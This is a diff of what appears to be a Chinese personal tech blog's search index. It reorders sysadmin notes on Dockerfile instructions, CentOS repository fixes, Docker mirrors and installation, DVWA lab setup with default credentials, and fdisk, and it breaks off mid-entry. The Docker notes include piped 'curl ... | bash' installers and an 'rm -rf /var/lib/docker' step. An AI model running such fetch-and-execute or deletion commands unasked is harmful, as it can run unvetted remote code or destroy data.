@@ -70,101 +70,6 @@ api配置文件</li>
       </tags>
   </entry>
   <entry>
-    <title>Dockerfile命令</title>
-    <url>/2024/08/11/Dockerfile%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<table>
-<thead>
-<tr>
-<th style="text-align:center">Dockerfile</th>
-<th style="text-align:left">指令	说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">FROM</td>
-<td style="text-align:left">指定基础镜像，用于后续的指令构建。</td>
-</tr>
-<tr>
-<td style="text-align:center">MAINTAINER</td>
-<td style="text-align:left">指定Dockerfile的作者/维护者。（已弃用，推荐使用LABEL指令）</td>
-</tr>
-<tr>
-<td style="text-align:center">LABEL</td>
-<td style="text-align:left">添加镜像的元数据，使用键值对的形式。</td>
-</tr>
-<tr>
-<td style="text-align:center">RUN</td>
-<td style="text-align:left">在构建过程中在镜像中执行命令。</td>
-</tr>
-<tr>
-<td style="text-align:center">CMD</td>
-<td style="text-align:left">指定容器创建时的默认命令。（可以被覆盖）</td>
-</tr>
-<tr>
-<td style="text-align:center">ENTRYPOINT</td>
-<td style="text-align:left">设置容器创建时的主要命令。（不可被覆盖）</td>
-</tr>
-<tr>
-<td style="text-align:center">EXPOSE</td>
-<td style="text-align:left">声明容器运行时监听的特定网络端口。</td>
-</tr>
-<tr>
-<td style="text-align:center">ENV</td>
-<td style="text-align:left">在容器内部设置环境变量。</td>
-</tr>
-<tr>
-<td style="text-align:center">ADD</td>
-<td style="text-align:left">将文件、目录或远程URL复制到镜像中。</td>
-</tr>
-<tr>
-<td style="text-align:center">COPY</td>
-<td style="text-align:left">将文件或目录复制到镜像中。</td>
-</tr>
-<tr>
-<td style="text-align:center">VOLUME</td>
-<td style="text-align:left">为容器创建挂载点或声明卷。</td>
-</tr>
-<tr>
-<td style="text-align:center">WORKDIR</td>
-<td style="text-align:left">设置后续指令的工作目录。</td>
-</tr>
-<tr>
-<td style="text-align:center">USER</td>
-<td style="text-align:left">指定后续指令的用户上下文。</td>
-</tr>
-<tr>
-<td style="text-align:center">ARG</td>
-<td style="text-align:left">定义在构建过程中传递给构建器的变量，可使用 “docker build” 命令设置。</td>
-</tr>
-<tr>
-<td style="text-align:center">ONBUILD</td>
-<td style="text-align:left">当该镜像被用作另一个构建过程的基础时，添加触发器。</td>
-</tr>
-<tr>
-<td style="text-align:center">STOPSIGNAL</td>
-<td style="text-align:left">设置发送给容器以退出的系统调用信号。</td>
-</tr>
-<tr>
-<td style="text-align:center">HEALTHCHECK</td>
-<td style="text-align:left">定义周期性检查容器健康状态的命令。</td>
-</tr>
-<tr>
-<td style="text-align:center">SHELL</td>
-<td style="text-align:left">覆盖Docker中默认的shell，用于RUN、CMD和ENTRYPOINT指令。</td>
-</tr>
-</tbody>
-</table>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kubernetes概览</title>
     <url>/2025/07/11/Kubernetes%E6%A6%82%E8%A7%88/</url>
     <content><![CDATA[<h2 id="k8s多节点集群架构图">k8s多节点集群架构图</h2>
@@ -320,6 +225,101 @@ api配置文件</li>
       <tags>
         <tag>Kubernetes</tag>
         <tag>k8s</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dockerfile命令</title>
+    <url>/2024/08/11/Dockerfile%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<table>
+<thead>
+<tr>
+<th style="text-align:center">Dockerfile</th>
+<th style="text-align:left">指令	说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">FROM</td>
+<td style="text-align:left">指定基础镜像，用于后续的指令构建。</td>
+</tr>
+<tr>
+<td style="text-align:center">MAINTAINER</td>
+<td style="text-align:left">指定Dockerfile的作者/维护者。（已弃用，推荐使用LABEL指令）</td>
+</tr>
+<tr>
+<td style="text-align:center">LABEL</td>
+<td style="text-align:left">添加镜像的元数据，使用键值对的形式。</td>
+</tr>
+<tr>
+<td style="text-align:center">RUN</td>
+<td style="text-align:left">在构建过程中在镜像中执行命令。</td>
+</tr>
+<tr>
+<td style="text-align:center">CMD</td>
+<td style="text-align:left">指定容器创建时的默认命令。（可以被覆盖）</td>
+</tr>
+<tr>
+<td style="text-align:center">ENTRYPOINT</td>
+<td style="text-align:left">设置容器创建时的主要命令。（不可被覆盖）</td>
+</tr>
+<tr>
+<td style="text-align:center">EXPOSE</td>
+<td style="text-align:left">声明容器运行时监听的特定网络端口。</td>
+</tr>
+<tr>
+<td style="text-align:center">ENV</td>
+<td style="text-align:left">在容器内部设置环境变量。</td>
+</tr>
+<tr>
+<td style="text-align:center">ADD</td>
+<td style="text-align:left">将文件、目录或远程URL复制到镜像中。</td>
+</tr>
+<tr>
+<td style="text-align:center">COPY</td>
+<td style="text-align:left">将文件或目录复制到镜像中。</td>
+</tr>
+<tr>
+<td style="text-align:center">VOLUME</td>
+<td style="text-align:left">为容器创建挂载点或声明卷。</td>
+</tr>
+<tr>
+<td style="text-align:center">WORKDIR</td>
+<td style="text-align:left">设置后续指令的工作目录。</td>
+</tr>
+<tr>
+<td style="text-align:center">USER</td>
+<td style="text-align:left">指定后续指令的用户上下文。</td>
+</tr>
+<tr>
+<td style="text-align:center">ARG</td>
+<td style="text-align:left">定义在构建过程中传递给构建器的变量，可使用 “docker build” 命令设置。</td>
+</tr>
+<tr>
+<td style="text-align:center">ONBUILD</td>
+<td style="text-align:left">当该镜像被用作另一个构建过程的基础时，添加触发器。</td>
+</tr>
+<tr>
+<td style="text-align:center">STOPSIGNAL</td>
+<td style="text-align:left">设置发送给容器以退出的系统调用信号。</td>
+</tr>
+<tr>
+<td style="text-align:center">HEALTHCHECK</td>
+<td style="text-align:left">定义周期性检查容器健康状态的命令。</td>
+</tr>
+<tr>
+<td style="text-align:center">SHELL</td>
+<td style="text-align:left">覆盖Docker中默认的shell，用于RUN、CMD和ENTRYPOINT指令。</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>docker命令</tag>
       </tags>
   </entry>
   <entry>
@@ -985,6 +985,29 @@ host               指定您希望抓取数据包的host（通常是本地网关
       </tags>
   </entry>
   <entry>
+    <title>centos-release-scl安装换源</title>
+    <url>/2025/03/23/centos-release-scl%E6%8A%A5%E9%94%99/</url>
+    <content><![CDATA[<h2 id="安装">安装</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br></pre></td></tr></table></figure>
+<p>centos7.9安装后遇到无法使用yum的问题，报错无法访问 <a href="http://mirrorlist.centos.org?arch=x86_64&amp;release=7&amp;repo=sclo-sclo">http://mirrorlist.centos.org?arch=x86_64&amp;release=7&amp;repo=sclo-sclo</a> ，换国内源即可解决</p>
+<h2 id="换源">换源</h2>
+<p>修改两个文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-SCLo-scl.repo /etc/yum.repos.d/CentOS-SCLo-scl.repo.bak</span><br><span class="line">mv /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo.bak</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/CentOS-SCLo-scl.repo</span><br><span class="line">vim /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo</span><br></pre></td></tr></table></figure>
+<p>更换为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[centos-sclo-rh]</span><br><span class="line">name=CentOS-7 - SCLo rh</span><br><span class="line">baseurl=http://vault.centos.org/centos/7/sclo/x86_64/rh/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-SCLo</span><br><span class="line"></span><br><span class="line">[centos-sclo-sclo]</span><br><span class="line">name=CentOS-7 - SCLo sclo</span><br><span class="line">baseurl=http://vault.centos.org/centos/7/sclo/x86_64/sclo/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-SCLo</span><br></pre></td></tr></table></figure>
+<p>清理缓存并生成新缓存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>centos</tag>
+        <tag>centos-release-scl</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>burpsuite工具学习版方法</title>
     <url>/2025/02/21/burpsuite%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%89%88%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<h2 id="前言">前言</h2>
@@ -1053,29 +1076,6 @@ host               指定您希望抓取数据包的host（通常是本地网关
       <tags>
         <tag>kali</tag>
         <tag>burpsuite</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos-release-scl安装换源</title>
-    <url>/2025/03/23/centos-release-scl%E6%8A%A5%E9%94%99/</url>
-    <content><![CDATA[<h2 id="安装">安装</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br></pre></td></tr></table></figure>
-<p>centos7.9安装后遇到无法使用yum的问题，报错无法访问 <a href="http://mirrorlist.centos.org?arch=x86_64&amp;release=7&amp;repo=sclo-sclo">http://mirrorlist.centos.org?arch=x86_64&amp;release=7&amp;repo=sclo-sclo</a> ，换国内源即可解决</p>
-<h2 id="换源">换源</h2>
-<p>修改两个文件内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-SCLo-scl.repo /etc/yum.repos.d/CentOS-SCLo-scl.repo.bak</span><br><span class="line">mv /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo.bak</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/CentOS-SCLo-scl.repo</span><br><span class="line">vim /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo</span><br></pre></td></tr></table></figure>
-<p>更换为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[centos-sclo-rh]</span><br><span class="line">name=CentOS-7 - SCLo rh</span><br><span class="line">baseurl=http://vault.centos.org/centos/7/sclo/x86_64/rh/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-SCLo</span><br><span class="line"></span><br><span class="line">[centos-sclo-sclo]</span><br><span class="line">name=CentOS-7 - SCLo sclo</span><br><span class="line">baseurl=http://vault.centos.org/centos/7/sclo/x86_64/sclo/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-SCLo</span><br></pre></td></tr></table></figure>
-<p>清理缓存并生成新缓存</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>centos</tag>
-        <tag>centos-release-scl</tag>
       </tags>
   </entry>
   <entry>
@@ -1216,6 +1216,21 @@ Digest: sha256:xxx…<br>
       </tags>
   </entry>
   <entry>
+    <title>docker 可用镜像源加速镜像025.2.27</title>
+    <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
+    <content><![CDATA[<h2 id="2025-2-27测试可用">2025.2.27测试可用</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="启用">启用</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker 卸载</title>
     <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
     <content><![CDATA[<h4 id="卸载命令">卸载命令</h4>
@@ -1235,12 +1250,63 @@ Digest: sha256:xxx…<br>
       </tags>
   </entry>
   <entry>
-    <title>docker 可用镜像源加速镜像025.2.27</title>
-    <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
-    <content><![CDATA[<h2 id="2025-2-27测试可用">2025.2.27测试可用</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="启用">启用</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
+    <title>Docker 安装</title>
+    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<h2 id="centos">centos</h2>
+<h3 id="自动安装docker">自动安装docker</h3>
+<p>使用官方安装脚本自动安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
+<p>国内安装命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>
+<h3 id="手动安装">手动安装</h3>
+<h4 id="卸载旧版本">卸载旧版本</h4>
+<p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">         docker-client \</span><br><span class="line">         docker-client-latest \</span><br><span class="line">         docker-common \</span><br><span class="line">         docker-latest \</span><br><span class="line">         docker-latest-logrotate \</span><br><span class="line">         docker-logrotate \</span><br><span class="line">         docker-engine</span><br></pre></td></tr></table></figure>
+<h4 id="安装-Docker-Engine-Community">安装 Docker Engine-Community</h4>
+<p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
+<h4 id="设置仓库">设置仓库</h4>
+<p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>
+<p>设置仓库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官方源地址（比较慢）</span><br><span class="line">   sudo yum-config-manager \</span><br><span class="line">   --add-repo \</span><br><span class="line">   https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">   </span><br><span class="line">   阿里云</span><br><span class="line">   sudo yum-config-manager \</span><br><span class="line">   --add-repo \</span><br><span class="line">   https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
+<h4 id="安装-Docker-Engine-Community-2">安装 Docker Engine-Community</h4>
+<p>最新版本安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>
+<p>查看版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure>
+<p>指定版本安装（仅需修改26.1.1）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io</span><br></pre></td></tr></table></figure>
+<h3 id="卸载-docker">卸载 docker</h3>
+<p>删除安装包：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce</span><br></pre></td></tr></table></figure>
+<p>删除镜像、容器、配置文件等内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="ubuntu">ubuntu</h2>
+<h3 id="检查卸载老版本docker">检查卸载老版本docker</h3>
+<p>docker的旧版本不一定被称为docker，<a href="http://docker.io">docker.io</a> 或 docker-engine</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
+<h3 id="安装步骤">安装步骤</h3>
+<ol>
+<li>更新软件包</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>安装docker依赖</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>添加Docker官方GPG密钥</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>添加Docker软件源</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>安装docker</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>系统运维</category>
         <category>docker</category>
@@ -1322,72 +1388,6 @@ mysql:5.7
       <tags>
         <tag>docker</tag>
         <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Docker 安装</title>
-    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<h2 id="centos">centos</h2>
-<h3 id="自动安装docker">自动安装docker</h3>
-<p>使用官方安装脚本自动安装：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
-<p>国内安装命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>
-<h3 id="手动安装">手动安装</h3>
-<h4 id="卸载旧版本">卸载旧版本</h4>
-<p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">         docker-client \</span><br><span class="line">         docker-client-latest \</span><br><span class="line">         docker-common \</span><br><span class="line">         docker-latest \</span><br><span class="line">         docker-latest-logrotate \</span><br><span class="line">         docker-logrotate \</span><br><span class="line">         docker-engine</span><br></pre></td></tr></table></figure>
-<h4 id="安装-Docker-Engine-Community">安装 Docker Engine-Community</h4>
-<p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
-<h4 id="设置仓库">设置仓库</h4>
-<p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>
-<p>设置仓库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官方源地址（比较慢）</span><br><span class="line">   sudo yum-config-manager \</span><br><span class="line">   --add-repo \</span><br><span class="line">   https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">   </span><br><span class="line">   阿里云</span><br><span class="line">   sudo yum-config-manager \</span><br><span class="line">   --add-repo \</span><br><span class="line">   https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
-<h4 id="安装-Docker-Engine-Community-2">安装 Docker Engine-Community</h4>
-<p>最新版本安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>
-<p>查看版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure>
-<p>指定版本安装（仅需修改26.1.1）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io</span><br></pre></td></tr></table></figure>
-<h3 id="卸载-docker">卸载 docker</h3>
-<p>删除安装包：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce</span><br></pre></td></tr></table></figure>
-<p>删除镜像、容器、配置文件等内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="ubuntu">ubuntu</h2>
-<h3 id="检查卸载老版本docker">检查卸载老版本docker</h3>
-<p>docker的旧版本不一定被称为docker，<a href="http://docker.io">docker.io</a> 或 docker-engine</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
-<h3 id="安装步骤">安装步骤</h3>
-<ol>
-<li>更新软件包</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>安装docker依赖</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>添加Docker官方GPG密钥</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>添加Docker软件源</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
-<ol start="5">
-<li>安装docker</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -1516,37 +1516,6 @@ docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
       </tags>
   </entry>
   <entry>
-    <title>dvwa-部署（docker）</title>
-    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="拉取镜像">拉取镜像</h2>
-<p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
-<pre><code>https://hub.docker.com/
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-<h2 id="运行容器">运行容器</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-<p>默认账号密码</p>
-<pre><code>dvwa/dvwa
-admin/password
-</code></pre>
-<h2 id="许可证">许可证</h2>
-<p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-<p>网上的使用方法<br>
-在DVWA-master/config/config.inc.php文件中找到下面代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
-<p>将其修改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>dvwa</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ettercap arp欺骗+dns劫持+钓鱼网站</title>
     <url>/2024/10/15/ettercap-arp%E6%AC%BA%E9%AA%97-dns%E5%8A%AB%E6%8C%81-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
     <content><![CDATA[<h2 id="简介">简介</h2>
@@ -1618,45 +1587,34 @@ ettercap使用要一次完成，在多次测试中发现，重新arp欺骗会无
       </tags>
   </entry>
   <entry>
-    <title>分区命令</title>
-    <url>/2025/01/15/fdisk/</url>
-    <content><![CDATA[<h2 id="fdisk">fdisk</h2>
-<h3 id="命令格式">命令格式</h3>
-<p>fdisk 路径 参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
-<p>一般配合使用的有<br>
-df -h<br>
-lsblk<br>
-mkfs.ext4<br>
-…</p>
-<h3 id="帮助">帮助</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span 